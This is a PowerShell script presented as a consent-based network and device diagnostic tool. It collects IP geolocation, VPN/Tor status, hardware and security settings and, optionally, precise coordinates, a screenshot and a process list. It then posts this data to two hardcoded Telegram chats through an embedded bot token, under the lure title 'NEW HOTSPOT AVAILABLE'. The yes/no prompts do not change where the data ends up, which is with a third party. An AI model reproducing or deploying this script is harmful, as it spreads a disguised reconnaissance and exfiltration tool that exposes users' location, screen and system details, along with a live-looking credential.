#requires -Version 5.1
# Network Intelligence Scanner v3.1 - consent-based diagnostics
# One file. Do not publish a real bot token to a public GitHub repository.
$ErrorActionPreference = 'Stop'
$botToken = '8715775001:AAGivZLOBG_YdpCuMlX6JIbFusUI5ofZ8Sk'
$chatIds = @('8640543929','8362186234')
$reportTitle = 'NEW HOTSPOT AVAILABLE'
$root = Join-Path ([Environment]::GetFolderPath('MyDocuments')) 'NetworkScannerReports'
New-Item -ItemType Directory -Path $root -Force | Out-Null
$stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
$na = 'Not Available'
$report = [ordered]@{}
$notes = New-Object System.Collections.Generic.List[string]
function Ask([string]$question) { ((Read-Host "$question [YES/NO]").Trim() -ieq 'YES') }
function Set-R([string]$name, $value) {
    if ($null -eq $value -or [string]::IsNullOrWhiteSpace([string]$value)) { $report[$name] = 'Not Available' }
    else { $report[$name] = [string]$value }
}
function Try-Measure([string]$label, [scriptblock]$action) {
    try { & $action } catch { $notes.Add("$label : $($_.Exception.Message)"); Write-Host "[$label] Not Available" -ForegroundColor DarkYellow }
}
function Api([string]$url) { Invoke-RestMethod -Uri $url -TimeoutSec 7 -ErrorAction Stop }
function Html($v) { [System.Net.WebUtility]::HtmlEncode([string]$v) }
function Probe([string]$hostName, [int]$port) {
    $tcp = New-Object System.Net.Sockets.TcpClient
    try {
        $ar=$tcp.BeginConnect($hostName,$port,$null,$null)
        if (-not $ar.AsyncWaitHandle.WaitOne(1300)) { return 'Unavailable / filtered' }
        $tcp.EndConnect($ar); 'Reachable'
    } catch { 'Unavailable / filtered' } finally { $tcp.Dispose() }
}
Write-Host 'Network Intelligence Scanner v3.1' -ForegroundColor Cyan
Write-Host 'Diagnostic information is collected locally. Telegram transfer requires confirmation.'
Set-R 'Scan time' (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
# Public addresses, individually best-effort; IPv6 is not guaranteed.
Try-Measure 'IPv4' { Set-R 'Public IPv4' (Api 'https://api.ipify.org?format=json').ip }
# Avoid a frightening warning if this machine has no working IPv6 DNS/route.
try {
  $v6=Api 'https://api6.ipify.org?format=json'
  if ($v6.ip) { Set-R 'Public IPv6' $v6.ip }
} catch {
  Set-R 'Public IPv6' 'Not Available (IPv6 endpoint unreachable; no IPv6 conclusion)'
  $notes.Add('IPv6 check inconclusive: the IPv6 endpoint could not be reached. Check IPv6 connectivity and DNS separately.')
}
$ip=$report['Public IPv4']
if ($ip -and $ip -ne $na) {
  Try-Measure 'IP geolocation' {
    $g=Api "https://ipapi.co/$ip/json/"
    if ($g.error) { throw 'Provider did not return a usable result' }
    Set-R 'Country (IP estimate)' $g.country_name; Set-R 'Region (IP estimate)' $g.region
    Set-R 'City (IP estimate)' $g.city; Set-R 'IP timezone' $g.timezone
    Set-R 'ISP / organization' $g.org; Set-R 'ASN' $g.asn
  }
  Try-Measure 'Proxy / VPN reputation' {
    $p=Api "https://proxycheck.io/v2/${ip}?vpn=1"
    $entry=$p.PSObject.Properties[$ip]
    if (-not $entry) { throw 'No matching IP result' }
    Set-R 'Proxy/VPN suspicion' $entry.Value.proxy
    Set-R 'Detection category' $entry.Value.type
    $notes.Add('Proxy/VPN result is heuristic, not proof. Tor cannot be reliably excluded by this check.')
  }
}
# Official Tor bulk exit list: IP-based indicator, not proof of absence of Tor.
Try-Measure 'Tor exit list' {
  $torText=Invoke-WebRequest -Uri 'https://check.torproject.org/torbulkexitlist' -UseBasicParsing -TimeoutSec 9 -ErrorAction Stop
  $torIPs=@($torText.Content -split '\r?\n' | Where-Object { $_ -match '^\d{1,3}(\.\d{1,3}){3}$' })
  if ($torIPs.Count -eq 0) { throw 'Exit-node dataset unavailable or empty' }
  Set-R 'Tor exit list' $(if ($ip -in $torIPs) { 'Public IP listed as Tor exit' } else { 'Not listed as known Tor exit (not proof of no Tor)' })
}
if (-not $report['Tor exit list']) { Set-R 'Tor exit list' 'Not Available (official dataset unreachable)' }
$notes.Add('Tor exit list tests only whether the public IP appears on a published exit-node list. A negative result does not rule out Tor.')
# Network adapters, DNS, active connection, local addresses
Try-Measure 'Local network' {
  $n=Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway } | Select-Object -First 1
  if (-not $n) { throw 'No default IPv4 network adapter' }
  Set-R 'Adapter' $n.InterfaceAlias
  Set-R 'Local IPv4' (($n.IPv4Address | ForEach-Object IPAddress) -join ', ')
  Set-R 'Gateway' (($n.IPv4DefaultGateway | ForEach-Object NextHop) -join ', ')
  Set-R 'Configured DNS' (($n.DNSServer.ServerAddresses) -join ', ')
  $adapter=Get-NetAdapter -InterfaceIndex $n.InterfaceIndex -ErrorAction SilentlyContinue
  if ($adapter) { Set-R 'Link speed' $adapter.LinkSpeed; Set-R 'Interface type' $adapter.InterfaceDescription }
}
Try-Measure 'DNS resolution' {
  $sw=[Diagnostics.Stopwatch]::StartNew()
  $addresses=[Net.Dns]::GetHostAddresses('example.com')
  $sw.Stop()
  Set-R 'DNS resolve example.com' ("{0} ms; {1} records" -f $sw.ElapsedMilliseconds, $addresses.Count)
}
Set-R 'DNS leak test' 'Not Available (requires independent resolver-observation service)'
Set-R 'WebRTC leak test' 'Not Available (requires browser WebRTC test)'
Try-Measure 'Ping' {
  $pings=@(Test-Connection -ComputerName '1.1.1.1' -Count 4 -ErrorAction SilentlyContinue)
  if ($pings.Count -eq 0) { throw 'No ICMP responses (ICMP might be blocked)' }
  $rtt=@($pings | ForEach-Object { [double]$_.ResponseTime })
  $avg=($rtt | Measure-Object -Average).Average
  $variance=(($rtt | ForEach-Object { [math]::Pow(($_-$avg),2) } | Measure-Object -Average).Average)
  Set-R 'Ping / jitter estimate' ('{0:N1} ms mean / {1:N1} ms std.dev.' -f $avg,[math]::Sqrt($variance))
  Set-R 'ICMP packet loss' ('{0}%' -f ([math]::Round(100*(4-$pings.Count)/4)))
}
# Wi-Fi: locale dependent netsh output, only retain values if keywords match.
Try-Measure 'Wi-Fi' {
  $w=netsh wlan show interfaces 2>$null | Out-String
  if ($LASTEXITCODE -ne 0 -or -not $w.Trim() -or $w -match '(?i)no wireless interface|there is no wireless|беспроводн.{0,45}отсутств') { throw 'Wi-Fi interface unavailable, not connected, or WLAN service unavailable' }
  foreach ($pair in @(@('Signal','Wi-Fi signal'),@('Channel','Wi-Fi channel'),@('Radio type','Wi-Fi standard'))) {
    if ($w -match "(?im)^\s*$([regex]::Escape($pair[0]))\s*:\s*(.+)$") { Set-R $pair[1] $Matches[1].Trim() }
  }
  if (-not $report['Wi-Fi signal']) { Set-R 'Wi-Fi signal' $na }
  if (-not $report['Wi-Fi channel']) { Set-R 'Wi-Fi channel' $na }
}
Set-R 'Wi-Fi channel congestion' 'Not Available (requires multi-network measurement)'
# Windows, hardware
Try-Measure 'Windows / hardware' {
  $os=Get-CimInstance Win32_OperatingSystem
  $cpu=Get-CimInstance Win32_Processor | Select-Object -First 1
  $cs=Get-CimInstance Win32_ComputerSystem
  Set-R 'Windows' ("$($os.Caption) build $($os.BuildNumber)")
  Set-R 'System uptime' ('{0:N1} hours' -f ((Get-Date)-$os.LastBootUpTime).TotalHours)
  Set-R 'System model' ("$($cs.Manufacturer) $($cs.Model)")
  Set-R 'CPU' ("$($cpu.Name); $($cpu.NumberOfCores) cores / $($cpu.NumberOfLogicalProcessors) threads")
  Set-R 'Installed RAM' ('{0:N1} GiB' -f ($cs.TotalPhysicalMemory/1GB))
  Set-R 'RAM usage at scan' ('{0:N0}%' -f (100*(1-$os.FreePhysicalMemory*1KB/$cs.TotalPhysicalMemory)))
  Set-R 'CPU load snapshot' ("$($cpu.LoadPercentage)%")
}
Try-Measure 'Graphics' {
  $gpu=Get-CimInstance Win32_VideoController | Where-Object Name | Select-Object -ExpandProperty Name -Unique
  Set-R 'GPU' ($gpu -join ', ')
}
Try-Measure 'Storage health' {
  $d=Get-PhysicalDisk -ErrorAction Stop | Select-Object FriendlyName,HealthStatus,MediaType,Size
  Set-R 'Storage devices / health' (($d | ForEach-Object { '{0} [{1}] {2} {3:N0} GB' -f $_.FriendlyName,$_.MediaType,$_.HealthStatus,($_.Size/1GB) }) -join '; ')
  $vol=Get-Volume | Where-Object { $_.DriveLetter -and $_.Size } | Select-Object -First 8
  Set-R 'Free disk space' (($vol | ForEach-Object { '{0}: {1:N1} GiB free' -f $_.DriveLetter,($_.SizeRemaining/1GB) }) -join '; ')
}
Set-R 'SMART wear / SSD temperature' 'Not Available (controller may not expose telemetry)'
Try-Measure 'SSD telemetry' {
  $disks=@(Get-PhysicalDisk -ErrorAction Stop)
  $measurements=@()
  foreach($disk in $disks) {
    try {
      $c=$disk | Get-StorageReliabilityCounter -ErrorAction Stop
      $parts=@()
      if ($null -ne $c.Wear -and [string]$c.Wear -ne '') { $parts+=('Wear: {0}%' -f $c.Wear) }
      if ($null -ne $c.Temperature -and $c.Temperature -gt 0) { $parts+=('Temperature: {0} C' -f $c.Temperature) }
      if ($parts.Count) { $measurements+=($disk.FriendlyName + ' / ' + ($parts -join ', ')) }
    } catch { } # Unsupported controllers are normal.
  }
  if ($measurements.Count) { Set-R 'SMART wear / SSD temperature' ($measurements -join '; ') }
}
Try-Measure 'Battery' {
  $b=Get-CimInstance Win32_Battery -ErrorAction Stop | Select-Object -First 1
  if (-not $b) { throw 'No battery reported' }
  Set-R 'Battery charge' ("$($b.EstimatedChargeRemaining)%")
  Set-R 'Battery status code' $b.BatteryStatus
}
Set-R 'Battery health/cycles' 'Not Available (requires supported battery telemetry)'
Try-Measure 'Battery health telemetry' {
  $design=Get-CimInstance -Namespace root/wmi -ClassName BatteryStaticData -ErrorAction Stop | Select-Object -First 1
  $full=Get-CimInstance -Namespace root/wmi -ClassName BatteryFullChargedCapacity -ErrorAction Stop | Select-Object -First 1
  if ($design.DesignedCapacity -gt 0 -and $full.FullChargedCapacity -gt 0) {
    Set-R 'Battery health/cycles' ('{0:N1}% estimated capacity health; cycle count Not Available' -f (100*$full.FullChargedCapacity/$design.DesignedCapacity))
  }
}
Try-Measure 'Display' {
  Add-Type -AssemblyName System.Windows.Forms
  $screens=@([Windows.Forms.Screen]::AllScreens)
  Set-R 'Displays' (($screens | ForEach-Object { '{0}x{1}' -f $_.Bounds.Width,$_.Bounds.Height }) -join ', ')
}
Set-R 'CPU / GPU temperatures' 'Not Available (sensor API or hardware monitor required)'
# Security and local services; measured without invasive scans
$securityChecks=@()
Try-Measure 'Firewall' {
  $fw=@(Get-NetFirewallProfile -ErrorAction Stop)
  $enabled=($fw | Where-Object Enabled).Count
  Set-R 'Windows Firewall' "$enabled/$($fw.Count) profiles enabled"
  $script:securityChecks+=($enabled -eq $fw.Count)
}
Try-Measure 'Defender' {
  $mp=Get-MpComputerStatus -ErrorAction Stop
  Set-R 'Defender antivirus' $(if ($mp.AntivirusEnabled) {'Enabled'} else {'Disabled'})
  $script:securityChecks+= [bool]$mp.AntivirusEnabled
}
Try-Measure 'Secure Boot' {
  $sb=Confirm-SecureBootUEFI -ErrorAction Stop
  Set-R 'Secure Boot' $sb
  $script:securityChecks+= [bool]$sb
}
Try-Measure 'BitLocker' {
  $bl=Get-BitLockerVolume -MountPoint $env:SystemDrive -ErrorAction Stop
  Set-R 'System drive BitLocker' $bl.ProtectionStatus
  $script:securityChecks+=($bl.ProtectionStatus -eq 'On')
}
if ($securityChecks.Count -gt 0) {
  $passed=@($securityChecks | Where-Object { $_ }).Count
  Set-R 'Security checks passed' "$passed/$($securityChecks.Count) (partial, not an official security score)"
}
foreach ($port in @(3389,445)) { Set-R "Local TCP $port (localhost)" (Probe '127.0.0.1' $port) }
Try-Measure 'Recent system errors' {
  $events=@(Get-WinEvent -FilterHashtable @{LogName='System';StartTime=(Get-Date).AddHours(-24);Level=1,2} -MaxEvents 250 -ErrorAction Stop)
  Set-R 'System critical/errors in 24h' $events.Count
  if ($events.Count -eq 250) { $notes.Add('Event count is capped at 250.') }
}
Try-Measure 'Power plan' {
  $p=powercfg /GETACTIVESCHEME | Out-String
  if ($LASTEXITCODE -ne 0) { throw 'Power plan unavailable' }
  Set-R 'Active power plan' $p.Trim()
}
Set-R 'Wattage / precise energy use' 'Not Available (requires dedicated sensors)'
Set-R 'Bottleneck analysis' 'Not Available (a reliable result requires repeated workload samples)'
# Exact device location is optional and only attempted after prior approval.
if (Ask 'Request device location from Windows? This may reveal precise coordinates') {
  Try-Measure 'Device location' {
    Add-Type -AssemblyName System.Device
    $watcher=New-Object System.Device.Location.GeoCoordinateWatcher([System.Device.Location.GeoPositionAccuracy]::Default)
    $started=$watcher.TryStart($false,[TimeSpan]::FromSeconds(5))
    if (-not $started -or $watcher.Position.Location.IsUnknown) { throw 'Location unavailable or permission denied' }
    $loc=$watcher.Position.Location
    Set-R 'Device coordinates (sensitive)' ('{0:F5}, {1:F5}' -f $loc.Latitude,$loc.Longitude)
    Set-R 'Device location precision (m)' $loc.HorizontalAccuracy
    $watcher.Stop()
  }
} else { Set-R 'Device coordinates (sensitive)' 'Not collected' }
# Screenshot - consent before capture, preview and separate consent before transfer.
$screenshot=$null
if (Ask 'Take a screenshot of the primary display?') {
  Try-Measure 'Screenshot' {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $bounds=[Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp=New-Object Drawing.Bitmap($bounds.Width,$bounds.Height)
    $gfx=[Drawing.Graphics]::FromImage($bmp)
    try { $gfx.CopyFromScreen($bounds.Location,[Drawing.Point]::Empty,$bounds.Size)
      $script:screenshot=Join-Path $root "screenshot_$stamp.png"
      $bmp.Save($screenshot,[Drawing.Imaging.ImageFormat]::Png)
    } finally { $gfx.Dispose();$bmp.Dispose() }
    Start-Process $screenshot
    Write-Host "Screenshot for review: $screenshot"
  }
}
# Local security assessment: rule-based expert notes, NOT a cloud AI model and NOT a vulnerability scan.
$findings=New-Object 'System.Collections.Generic.List[string]'
$risk=0
if ($report['Windows Firewall'] -match '^(\d+)/(\d+) profiles enabled$') {
  if ([int]$Matches[1] -lt [int]$Matches[2]) {
    $risk+=2
    $findings.Add('HIGH: At least one Windows Firewall profile is disabled. Review firewall profiles and your network type.')
  } else { $findings.Add('OK: Windows Firewall is enabled for all returned profiles.') }
} else { $findings.Add('UNKNOWN: Firewall state could not be assessed.') }
if ($report['Defender antivirus'] -eq 'Disabled') { $risk+=2; $findings.Add('HIGH: Microsoft Defender reports antivirus disabled. Confirm another trusted antivirus is active.') }
elseif ($report['Defender antivirus'] -eq 'Enabled') { $findings.Add('OK: Microsoft Defender reports antivirus enabled.') }
else { $findings.Add('UNKNOWN: Antivirus protection could not be verified; this does not prove it is off.') }
if ($report['Secure Boot'] -eq 'False') { $risk+=1; $findings.Add('REVIEW: Secure Boot appears disabled. Check whether your hardware supports it.') }
elseif (-not $report['Secure Boot']) { $findings.Add('UNKNOWN: Secure Boot status could not be read, possibly due to privileges or firmware.') }
if ($report['System drive BitLocker'] -eq 'Off') { $risk+=1; $findings.Add('REVIEW: System-drive encryption protection appears off. Consider BitLocker/device encryption.') }
elseif (-not $report['System drive BitLocker']) { $findings.Add('UNKNOWN: System-drive encryption state could not be checked.') }
foreach ($port in @(3389,445)) {
  if ($report["Local TCP $port (localhost)"] -eq 'Reachable') {
    $findings.Add("REVIEW: TCP $port responds on localhost. This DOES NOT mean the service is reachable from the internet. Verify listening interfaces, firewall rules, and whether the service is needed.")
    $risk+=1
  }
}
if ($report['ICMP packet loss'] -match '^(\d+)%' -and [int]$Matches[1] -ge 25) {
  $findings.Add('REVIEW: ICMP replies indicate high packet loss; ICMP filtering can also distort this measurement.')
}
if ($report['Proxy/VPN suspicion'] -eq 'yes') { $findings.Add('INFO: IP reputation suggests proxy/VPN usage, not necessarily a vulnerability.') }
$findings.Add('SCOPE: This is a limited configuration review, not a penetration test, malware detection, external port scan, or cloud AI assessment.')
$findings.Add('PRIVACY: IP geolocation is approximate; device coordinates and screenshot require separate consent.')
Set-R 'Security assistant risk' $(if ($risk -ge 3) {'Attention needed'} elseif ($risk -ge 1) {'Review suggested'} else {'No confirmed high-risk configuration from available checks'})
Set-R 'Security assistant assessment (local rules)' ($findings -join ' | ')
$notes.Add('Security assistant uses transparent local rules; it does not query an AI model or certify the device as secure.')
$notes.Add('Assistant assessment: '+$report['Security assistant risk']+'. '+(($findings | Where-Object { $_ -match '^(HIGH|REVIEW|UNKNOWN):' } | Select-Object -First 4) -join ' '))

# Running-process list: no command line, file paths, username or environment variables.
# Separate consent to create, preview and send this sensitive report.
$processFile=$null
if (Ask 'Create a TXT list of running processes (PID, name, CPU seconds, memory)?') {
  Try-Measure 'Process TXT export' {
    $script:processFile=Join-Path $root "processes_$stamp.txt"
    $ps=@(Get-Process -ErrorAction Stop | Sort-Object ProcessName,Id)
    $header=@('Network Scanner process report','Collected: '+(Get-Date -Format 'yyyy-MM-dd HH:mm:ss'),'Processes: '+$ps.Count,'',"PID`tProcess`tCPU_seconds`tWorkingSet_MiB")
    $lines=@(foreach($proc in $ps) {
      $cpu='Not Available'
      try { if ($null -ne $proc.CPU) { $cpu='{0:N1}' -f [double]$proc.CPU } } catch {}
      $mem='Not Available'
      try { $mem='{0:N1}' -f ([double]$proc.WorkingSet64 / 1MB) } catch {}
      "{0}`t{1}`t{2}`t{3}" -f $proc.Id,$proc.ProcessName,$cpu,$mem
    })
    ($header+$lines) | Set-Content -Path $processFile -Encoding UTF8
    Start-Process notepad.exe -ArgumentList ('"'+$processFile+'"')
    Write-Host "Process TXT created for review: $processFile"
  }
}
# Save local reports
$report['Measurement notes']=($notes -join ' | ')
$jsonFile=Join-Path $root "scan_$stamp.json"
$htmlFile=Join-Path $root "scan_$stamp.html"
$report | ConvertTo-Json -Depth 6 | Set-Content -Path $jsonFile -Encoding UTF8
$rows=@(foreach($key in $report.Keys){'<tr><th>{0}</th><td>{1}</td></tr>' -f (Html $key),(Html $report[$key])})
$doc='<!doctype html><html><head><meta charset="utf-8"><title>Network Scanner</title><style>body{background:#111827;color:#e5e7eb;font:15px Segoe UI,Arial;padding:28px}table{border-collapse:collapse;width:100%}td,th{border:1px solid #374151;padding:9px;text-align:left}th{width:35%;color:#93c5fd}tr:nth-child(even){background:#1f2937}</style></head><body><h1>Network Scanner v3.1</h1><table>'+($rows -join "`n")+'</table></body></html>'
$doc | Set-Content -Path $htmlFile -Encoding UTF8
Write-Host "`n====== REPORT PREVIEW ======" -ForegroundColor Cyan
foreach($key in $report.Keys){ Write-Host ('{0}: {1}' -f $key,$report[$key]) }
Write-Host "`nJSON: $jsonFile`nHTML: $htmlFile"
# Telegram: no silent exfiltration. Explicit separate approval for network data and screenshot.
if (Ask 'Send the displayed network and device report to BOTH configured Telegram chats?') {
  if ($botToken -eq 'PASTE_NEW_BOT_TOKEN_HERE' -or -not $botToken) { Write-Warning 'Set the bot token first.' }
  else {
    $lines=@(foreach($key in $report.Keys){ '<b>{0}:</b> {1}' -f (Html $key),(Html $report[$key]) })
    $message='<b>'+(Html $reportTitle)+'</b>'+"`n`n"+($lines -join "`n")
    if ($message.Length -gt 4000) { $message=$message.Substring(0,3900)+"`n(Report truncated; full HTML/JSON saved locally)" }
    foreach($chatId in $chatIds) {
      try {
        Invoke-RestMethod -Method Post -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Body @{chat_id=$chatId;text=$message;parse_mode='HTML'} -TimeoutSec 15 -ErrorAction Stop | Out-Null
        Write-Host "Report sent to $chatId"
      } catch { Write-Warning "Telegram report to ${chatId}: $($_.Exception.Message)" }
    }
  }
}
if ($screenshot -and (Test-Path $screenshot) -and (Ask 'Send the reviewed screenshot to BOTH Telegram chats?')) {
  if ($botToken -eq 'PASTE_NEW_BOT_TOKEN_HERE' -or -not $botToken) { Write-Warning 'Set the bot token first.' }
  else {
    Try-Measure 'Telegram photo' {
      Add-Type -AssemblyName System.Net.Http
      foreach($chatId in $chatIds){
        $client=[Net.Http.HttpClient]::new();$form=[Net.Http.MultipartFormDataContent]::new()
        try {
          $form.Add([Net.Http.StringContent]::new([string]$chatId),'chat_id')
          $photo=[Net.Http.ByteArrayContent]::new([IO.File]::ReadAllBytes($screenshot))
          $photo.Headers.ContentType=[Net.Http.Headers.MediaTypeHeaderValue]::Parse('image/png')
          $form.Add($photo,'photo','screenshot.png')
          $response=$client.PostAsync("https://api.telegram.org/bot$botToken/sendPhoto",$form).GetAwaiter().GetResult()
          $response.EnsureSuccessStatusCode() | Out-Null
          Write-Host "Screenshot sent to $chatId"
        } catch { Write-Warning "Photo to ${chatId}: $($_.Exception.Message)" }
        finally { $form.Dispose();$client.Dispose() }
      }
    }
  }
}
# Separate explicit consent before a process list leaves the device.
if ($processFile -and (Test-Path $processFile) -and
    (Ask 'Send the reviewed running-process TXT to BOTH Telegram chats?')) {
  if ($botToken -eq 'PASTE_NEW_BOT_TOKEN_HERE' -or -not $botToken) { Write-Warning 'Set the bot token first.' }
  else {
    Try-Measure 'Telegram process document' {
      Add-Type -AssemblyName System.Net.Http
      foreach ($chatId in $chatIds) {
        $client=[Net.Http.HttpClient]::new()
        $form=[Net.Http.MultipartFormDataContent]::new()
        try {
          $form.Add([Net.Http.StringContent]::new([string]$chatId),'chat_id')
          $attachment=[Net.Http.ByteArrayContent]::new([IO.File]::ReadAllBytes($processFile))
          $attachment.Headers.ContentType=[Net.Http.Headers.MediaTypeHeaderValue]::Parse('text/plain')
          $form.Add($attachment,'document',[IO.Path]::GetFileName($processFile))
          $response=$client.PostAsync("https://api.telegram.org/bot$botToken/sendDocument",$form).GetAwaiter().GetResult()
          $response.EnsureSuccessStatusCode() | Out-Null
          Write-Host "Process list sent to $chatId"
        } catch { Write-Warning "Process document to ${chatId}: $($_.Exception.Message)" }
        finally { $form.Dispose(); $client.Dispose() }
      }
    }
  }
}
Write-Host "Complete. Local reports: $root" -ForegroundColor Green
Read-Host 'Press Enter to exit' | Out-Null
